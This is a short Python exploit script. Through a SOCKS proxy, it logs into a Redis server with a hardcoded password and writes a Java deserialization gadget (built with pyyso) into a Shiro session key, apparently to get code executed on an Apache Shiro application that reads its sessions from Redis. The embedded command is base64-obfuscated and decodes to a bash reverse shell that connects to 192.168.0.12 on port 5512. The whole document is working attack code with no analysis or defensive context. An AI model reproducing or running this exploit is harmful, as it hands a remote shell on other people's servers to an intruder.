import pyyso
import socks
import socket

socks.set_default_proxy(socks.SOCKS5, addr='192.168.0.12', port=1090)
socket.socket = socks.socksocket
s = socket.socket()
s.connect(("192.168.10.175", 6379))
s.send(b"auth abc123 \n")
authResult = s.recv(1024)
if b'+OK' in authResult:
    print("Login success")
else:
    print("Login failed")
key = b"shiro:session:123"
value = pyyso.cb1v192("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTIvNTUxMiAwPiYx}|{base64,-d}|{bash,-i}")
s.send(b"\x2a\x33\x0d\x0a\x24\x33\x0d\x0aSET\r\n\x24"+str(len(key)).encode()+b"\r\n"+key+b"\r\n\x24"
       + str(len(value)).encode()+b"\r\n"+value+b"\r\n")
if b"+OK" in s.recv(3):
    print("success")

